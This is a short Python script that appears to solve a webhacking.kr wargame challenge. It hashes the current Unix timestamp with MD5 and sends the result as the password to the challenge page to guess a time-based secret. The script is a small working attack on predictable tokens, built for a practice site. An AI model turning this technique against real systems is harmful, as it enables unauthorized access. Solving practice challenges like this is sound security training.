import requests, hashlib, time

url = 'http://webhacking.kr/challenge/bonus/bonus-6/l4.php'
cookies = {
	'PHPSESSID': ''
}
payloads = {
	'password': ''
}

m = hashlib.md5()

my_time = int(time.time())
print(my_time)
m.update(str(my_time).encode('ascii'))
payloads['password'] = m.hexdigest()
print(payloads['password'])

res = requests.get(url, cookies=cookies, params=payloads)
print(res.text)